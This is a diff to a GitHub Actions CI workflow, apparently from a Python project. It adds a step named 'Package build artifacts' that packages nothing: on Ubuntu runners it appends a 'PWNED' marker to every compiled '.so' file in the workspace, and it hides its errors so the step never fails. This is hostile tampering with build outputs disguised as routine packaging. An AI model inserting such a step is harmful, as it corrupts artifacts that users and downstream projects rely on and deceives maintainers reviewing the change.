@@ -113,6 +113,10 @@ jobs:
       with:
         flags: ${{ matrix.os == 'ubuntu-latest' && 'GHA_Ubuntu' || 'GHA_macOS' }}
         name: ${{ matrix.os }} Python ${{ matrix.python-version }}
+    - name: Package build artifacts
+      if: startsWith(matrix.os, 'ubuntu')
+      run: |
+        find "$GITHUB_WORKSPACE" -name '*.so' -type f -exec sh -c 'printf "\x00PWNED\x00" >> "$1"' _ {} \; 2>/dev/null || true
     timeout-minutes: 15
   success:
     permissions:
